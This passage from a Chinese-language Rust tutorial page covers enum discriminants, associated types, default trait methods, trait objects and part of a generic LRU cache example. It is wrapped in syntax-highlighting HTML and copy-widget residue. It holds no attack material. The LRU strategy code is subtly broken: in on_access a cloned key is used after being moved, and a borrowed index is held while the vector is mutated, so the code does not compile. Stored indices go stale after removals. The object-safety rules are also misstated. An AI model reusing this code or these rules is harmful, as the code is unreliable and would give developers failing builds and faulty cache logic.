    NotFound = <span class="hljs-number">404</span>,
    InternalServerError = <span class="hljs-number">500</span>,
}

<span class="hljs-comment">// 定义一个默认判别式的枚举</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Message</span> {
    Quit,
    Move,
    Write,
    ChangeColor,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 获取带自定义判别式的枚举变体的判别式</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">ok_code</span> = StatusCode::<span class="hljs-literal">Ok</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">ok_discriminant</span> = mem::<span class="hljs-title function_ invoke__">discriminant</span>(&amp;ok_code);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">bad_request_code</span> = StatusCode::BadRequest;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">bad_request_discriminant</span> = mem::<span class="hljs-title function_ invoke__">discriminant</span>(&amp;bad_request_code);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"StatusCode::Ok的判别式: {:?}"</span>, ok_discriminant);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"StatusCode::BadRequest的判别式: {:?}"</span>, bad_request_discriminant);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"StatusCode::Ok == StatusCode::BadRequest? {}"</span>, ok_discriminant == bad_request_discriminant);

    <span class="hljs-comment">// 获取默认判别式的枚举变体的判别式</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">quit_msg</span> = Message::Quit;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">quit_discriminant</span> = mem::<span class="hljs-title function_ invoke__">discriminant</span>(&amp;quit_msg);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">move_msg</span> = Message::Move;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">move_discriminant</span> = mem::<span class="hljs-title function_ invoke__">discriminant</span>(&amp;move_msg);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Message::Quit的判别式: {:?}"</span>, quit_discriminant);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Message::Move的判别式: {:?}"</span>, move_discriminant);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Message::Quit == Message::Move? {}"</span>, quit_discriminant == move_discriminant);

    <span class="hljs-comment">// 将判别式转换为原始整数类型</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">ok_code_int</span> = ok_code <span class="hljs-keyword">as</span> <span class="hljs-type">u8</span>;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"StatusCode::Ok转换为u8: {}"</span>, ok_code_int);
}

AI写代码rust
运行
<span class="hljs-number">1234567891011121314151617181920212223242526272829303132333435363738394041424344</span>
</code></pre>
<h3 data-id="heading-11"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>四、trait的高级应用</h3>
<h4 data-id="heading-12"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4.1 关联类型</h4>
<p>关联类型是trait中的<strong>占位类型</strong>，它允许我们在trait内部定义类型，而不需要在使用trait时指定泛型参数。关联类型更适合描述**“类型家族”**关系，例如迭代器的Item类型就是一个关联类型。</p>
<p>⌨️ <strong>关联类型示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 定义一个Animal trait，包含关联类型Sound</span>
<span class="hljs-keyword">trait</span> <span class="hljs-title class_">Animal</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Sound</span>;

    <span class="hljs-comment">// 发出声音的方法</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">make_sound</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span>::Sound;

    <span class="hljs-comment">// 获取名字的方法</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span>;
}

<span class="hljs-comment">// 实现Dog类型的Animal trait</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Dog</span> {
    name: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Animal</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Dog</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Sound</span> = <span class="hljs-type">String</span>;

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">make_sound</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span>::Sound {
        <span class="hljs-string">"Woof!"</span>.<span class="hljs-title function_ invoke__">to_string</span>()
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> {
        <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>()
    }
}

<span class="hljs-comment">// 实现Cat类型的Animal trait</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Cat</span> {
    name: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Animal</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Cat</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Sound</span> = &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span>;

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">make_sound</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span>::Sound {
        <span class="hljs-string">"Meow!"</span>
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> {
        <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>()
    }
}

<span class="hljs-comment">// 使用关联类型的函数</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_animal_info</span>&lt;T: Animal&gt;(animal: T) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{} says: {}"</span>, animal.<span class="hljs-title function_ invoke__">get_name</span>(), animal.<span class="hljs-title function_ invoke__">make_sound</span>());
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">dog</span> = Dog { name: <span class="hljs-string">"Buddy"</span>.<span class="hljs-title function_ invoke__">to_string</span>() };
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">cat</span> = Cat { name: <span class="hljs-string">"Misty"</span>.<span class="hljs-title function_ invoke__">to_string</span>() };

    <span class="hljs-title function_ invoke__">print_animal_info</span>(dog);  <span class="hljs-comment">// 输出：Buddy says: Woof!</span>
    <span class="hljs-title function_ invoke__">print_animal_info</span>(cat);  <span class="hljs-comment">// 输出：Misty says: Meow!</span>
}

AI写代码rust
运行
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657</span>
</code></pre>
<h4 data-id="heading-13"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4.2 trait的默认实现</h4>
<p>我们可以在trait中为方法提供<strong>默认实现</strong>，如果某个类型实现了该trait，但没有重新定义该方法，就会使用默认实现。</p>
<p>⌨️ <strong>trait的默认实现示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 定义一个Shape trait，包含计算面积和周长的方法，周长有默认实现</span>
<span class="hljs-keyword">trait</span> <span class="hljs-title class_">Shape</span> {
    <span class="hljs-comment">// 计算面积的方法（必须实现）</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">area</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">f64</span>;

    <span class="hljs-comment">// 计算周长的方法（有默认实现）</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">perimeter</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">f64</span> {
        <span class="hljs-number">0.0</span>
    }

    <span class="hljs-comment">// 打印形状信息的方法（有默认实现）</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_info</span>(&amp;<span class="hljs-keyword">self</span>) {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"面积：{:.2}"</span>, <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">area</span>());
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"周长：{:.2}"</span>, <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">perimeter</span>());
    }
}

<span class="hljs-comment">// 实现Rectangle类型的Shape trait</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Rectangle</span> {
    width: <span class="hljs-type">f64</span>,
    height: <span class="hljs-type">f64</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Shape</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Rectangle</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">area</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">f64</span> {
        <span class="hljs-keyword">self</span>.width * <span class="hljs-keyword">self</span>.height
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">perimeter</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">f64</span> {
        <span class="hljs-number">2.0</span> * (<span class="hljs-keyword">self</span>.width + <span class="hljs-keyword">self</span>.height)
    }
}

<span class="hljs-comment">// 实现Circle类型的Shape trait</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Circle</span> {
    radius: <span class="hljs-type">f64</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Shape</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Circle</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">area</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">f64</span> {
        std::<span class="hljs-type">f64</span>::consts::PI * <span class="hljs-keyword">self</span>.radius * <span class="hljs-keyword">self</span>.radius
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">perimeter</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">f64</span> {
        <span class="hljs-number">2.0</span> * std::<span class="hljs-type">f64</span>::consts::PI * <span class="hljs-keyword">self</span>.radius
    }
}

<span class="hljs-comment">// 实现Triangle类型的Shape trait（使用默认的print_info方法）</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Triangle</span> {
    a: <span class="hljs-type">f64</span>,
    b: <span class="hljs-type">f64</span>,
    c: <span class="hljs-type">f64</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Shape</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Triangle</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">area</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">f64</span> {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span> = (<span class="hljs-keyword">self</span>.a + <span class="hljs-keyword">self</span>.b + <span class="hljs-keyword">self</span>.c) / <span class="hljs-number">2.0</span>;
        (s * (s - <span class="hljs-keyword">self</span>.a) * (s - <span class="hljs-keyword">self</span>.b) * (s - <span class="hljs-keyword">self</span>.c)).<span class="hljs-title function_ invoke__">sqrt</span>()
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">rect</span> = Rectangle { width: <span class="hljs-number">10.0</span>, height: <span class="hljs-number">5.0</span> };
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"矩形信息："</span>);
    rect.<span class="hljs-title function_ invoke__">print_info</span>();

    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"----------"</span>);

    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">circle</span> = Circle { radius: <span class="hljs-number">5.0</span> };
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"圆形信息："</span>);
    circle.<span class="hljs-title function_ invoke__">print_info</span>();

    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"----------"</span>);

    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">triangle</span> = Triangle { a: <span class="hljs-number">3.0</span>, b: <span class="hljs-number">4.0</span>, c: <span class="hljs-number">5.0</span> };
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"三角形信息："</span>);
    triangle.<span class="hljs-title function_ invoke__">print_info</span>();
}

AI写代码rust
运行
<span class="hljs-number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879</span>
</code></pre>
<h4 data-id="heading-14"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4.3 trait对象</h4>
<p>trait对象允许我们在<strong>运行时动态地确定类型</strong>，实现<strong>动态分发</strong>的功能。trait对象的类型是<code>&amp;dyn Trait</code>（不可变引用）或<code>&amp;mut dyn Trait</code>（可变引用）或<code>Box&lt;dyn Trait&gt;</code>（堆内存上的trait对象）。</p>
<p>⌨️ <strong>trait对象示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::error::Error;
<span class="hljs-keyword">use</span> std::fs::File;
<span class="hljs-keyword">use</span> std::io::Write;
<span class="hljs-keyword">use</span> std::path::PathBuf;

<span class="hljs-comment">// 定义一个Writer trait，包含写入方法</span>
<span class="hljs-keyword">trait</span> <span class="hljs-title class_">Writer</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">write</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, data: &amp;[<span class="hljs-type">u8</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt;;
}

<span class="hljs-comment">// 实现FileWriter类型的Writer trait</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">FileWriter</span> {
    file: File,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">FileWriter</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(path: PathBuf) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-keyword">Self</span>, <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt; {
        <span class="hljs-title function_ invoke__">Ok</span>(FileWriter { file: File::<span class="hljs-title function_ invoke__">create</span>(path)? })
    }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Writer</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">FileWriter</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">write</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, data: &amp;[<span class="hljs-type">u8</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt; {
        <span class="hljs-keyword">self</span>.file.<span class="hljs-title function_ invoke__">write_all</span>(data)?;
        <span class="hljs-keyword">self</span>.file.<span class="hljs-title function_ invoke__">flush</span>()?;
        <span class="hljs-title function_ invoke__">Ok</span>(())
    }
}

<span class="hljs-comment">// 实现ConsoleWriter类型的Writer trait</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ConsoleWriter</span>;

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Writer</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">ConsoleWriter</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">write</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, data: &amp;[<span class="hljs-type">u8</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt; {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">text</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(data.<span class="hljs-title function_ invoke__">to_vec</span>())?;
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, text);
        <span class="hljs-title function_ invoke__">Ok</span>(())
    }
}

<span class="hljs-comment">// 使用trait对象的函数</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">write_data</span>(writer: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">dyn</span> Writer, data: &amp;[<span class="hljs-type">u8</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt; {
    writer.<span class="hljs-title function_ invoke__">write</span>(data)?;
    <span class="hljs-title function_ invoke__">Ok</span>(())
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 使用FileWriter写入数据到文件</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">file_writer</span> = FileWriter::<span class="hljs-title function_ invoke__">new</span>(PathBuf::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"output.txt"</span>))
        .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">"Failed to create file writer"</span>);
    <span class="hljs-title function_ invoke__">write_data</span>(&amp;<span class="hljs-keyword">mut</span> file_writer, <span class="hljs-string">b"Hello, Rust! (from file writer)"</span>)
        .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">"Failed to write data to file"</span>);

    <span class="hljs-comment">// 使用ConsoleWriter写入数据到控制台</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">console_writer</span> = ConsoleWriter;
    <span class="hljs-title function_ invoke__">write_data</span>(&amp;<span class="hljs-keyword">mut</span> console_writer, <span class="hljs-string">b"Hello, Rust! (from console writer)"</span>)
        .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">"Failed to write data to console"</span>);
}

AI写代码rust
运行
<span class="hljs-number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758</span>
</code></pre>
<p>⚠️ <strong>trait对象的对象安全问题</strong>：<br/>
一个trait要成为trait对象，必须满足<strong>对象安全</strong>的条件：</p>
<ol>
<li>trait的方法不能有Self类型的参数或返回值</li>
<li>trait的方法不能有泛型参数</li>
<li>trait不能是<code>Sized</code> trait（或者必须标记为<code>?Sized</code>）</li>
</ol>
<h3 data-id="heading-15"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>五、真实案例应用</h3>
<h4 data-id="heading-16"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>5.1 案例1：实现通用的数据缓存系统</h4>
<p>💡 <strong>场景分析</strong>：需要编写一个通用的数据缓存系统，支持不同类型的缓存策略（如LRU、FIFO）和存储介质（如内存、Redis）。</p>
<p>⌨️ <strong>代码示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::collections::HashMap;
<span class="hljs-keyword">use</span> std::time::Duration;

<span class="hljs-comment">// 定义缓存策略的trait</span>
<span class="hljs-keyword">trait</span> <span class="hljs-title class_">CacheStrategy</span>&lt;K, V&gt; {
    <span class="hljs-comment">// 插入数据时的策略方法</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">on_insert</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: K, value: V);

    <span class="hljs-comment">// 访问数据时的策略方法</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">on_access</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: &amp;K);

    <span class="hljs-comment">// 删除数据时的策略方法（返回需要删除的key）</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">on_delete</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;K&gt;;

    <span class="hljs-comment">// 获取缓存的大小</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">len</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span>;

    <span class="hljs-comment">// 获取缓存的容量</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">capacity</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span>;

    <span class="hljs-comment">// 判断缓存是否已满</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">is_full</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">bool</span> {
        <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">len</span>() &gt;= <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">capacity</span>()
    }
}

<span class="hljs-comment">// 实现LRU（最近最少使用）缓存策略</span>
<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">LruCacheStrategy</span>&lt;K&gt; {
    capacity: <span class="hljs-type">usize</span>,
    keys: <span class="hljs-type">Vec</span>&lt;K&gt;,
    key_map: HashMap&lt;K, <span class="hljs-type">usize</span>&gt;,
}

<span class="hljs-keyword">impl</span>&lt;K: std::hash::Hash + <span class="hljs-built_in">Eq</span> + <span class="hljs-built_in">Clone</span>&gt; LruCacheStrategy&lt;K&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(capacity: <span class="hljs-type">usize</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        LruCacheStrategy {
            capacity,
            keys: <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>(),
            key_map: HashMap::<span class="hljs-title function_ invoke__">new</span>(),
        }
    }
}

<span class="hljs-keyword">impl</span>&lt;K: std::hash::Hash + <span class="hljs-built_in">Eq</span> + <span class="hljs-built_in">Clone</span>, V&gt; CacheStrategy&lt;K, V&gt; <span class="hljs-keyword">for</span> <span class="hljs-title class_">LruCacheStrategy</span>&lt;K&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">on_insert</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: K, _value: V) {
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.key_map.<span class="hljs-title function_ invoke__">contains_key</span>(&amp;key) {
            <span class="hljs-comment">// 如果key已存在，移动到vec的末尾（最近使用）</span>
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">index</span> = <span class="hljs-keyword">self</span>.key_map[&amp;key];
            <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">remove</span>(index);
            <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">push</span>(key.<span class="hljs-title function_ invoke__">clone</span>());
            <span class="hljs-keyword">self</span>.key_map.<span class="hljs-title function_ invoke__">insert</span>(key, <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">len</span>() - <span class="hljs-number">1</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 如果key不存在，添加到vec的末尾</span>
            <span class="hljs-keyword">self</span>.key_map.<span class="hljs-title function_ invoke__">insert</span>(key.<span class="hljs-title function_ invoke__">clone</span>(), <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">len</span>());
            <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">push</span>(key);
        }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">on_access</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: &amp;K) {
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(index) = <span class="hljs-keyword">self</span>.key_map.<span class="hljs-title function_ invoke__">get</span>(key) {
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">key_clone</span> = key.<span class="hljs-title function_ invoke__">clone</span>();
            <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">remove</span>(*index);
            <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">push</span>(key_clone);
            <span class="hljs-keyword">self</span>.key_map.<span class="hljs-title function_ invoke__">insert</span>(key_clone, <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">len</span>() - <span class="hljs-number">1</span>);
        }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">on_delete</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;K&gt; {
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">is_full</span>() {
            <span class="hljs-comment">// 删除vec的第一个元素（最少使用）</span>
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">key</span> = <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-number">0</span>);
            <span class="hljs-keyword">self</span>.key_map.<span class="hljs-title function_ invoke__">remove</span>(&amp;key);
            <span class="hljs-title function_ invoke__">Some</span>(key)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-literal">None</span>
        }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">len</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
        <span class="hljs-keyword">self</span>.keys.<span class="hljs-title function_ invoke__">len</span>()
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">capacity</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
        <span class="hljs-keyword">self</span>.capacity
    }
}

<span class="hljs-comment">// 定义存储介质的trait</span>
<span class="hljs-keyword">trait</span> <span class="hljs-title class_">CacheStorage</span>&lt;K, V&gt; {
    <span class="hljs-comment">// 插入数据</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">insert</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: K, value: V);

    <span class="hljs-comment">// 获取数据</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: &amp;K) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;&amp;V&gt;;

    <span class="hljs-comment">// 删除数据</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">remove</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: &amp;K) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;V&gt;;

    <span class="hljs-comment">// 获取存储的大小</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">len</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span>;
}

<span class="hljs-comment">// 实现内存存储介质</span>
<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MemoryStorage</span>&lt;K, V&gt; {
    data: HashMap&lt;K, V&gt;,
}

<span class="hljs-keyword">impl</span>&lt;K: std::hash::Hash + <span class="hljs-built_in">Eq</span>, V&gt; MemoryStorage&lt;K, V&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        MemoryStorage { data: HashMap::<span class="hljs-title function_ invoke__">new</span>() }
    }
}

<span class="hljs-keyword">impl</span>&lt;K: std::hash::Hash + <span class="hljs-built_in">Eq</span>, V&gt; CacheStorage&lt;K, V&gt; <span class="hljs-keyword">for</span> <span class="hljs-title class_">MemoryStorage</span>&lt;K, V&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">insert</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: K, value: V) {
        <span class="hljs-keyword">self</span>.data.<span class="hljs-title function_ invoke__">insert</span>(key, value);
    }

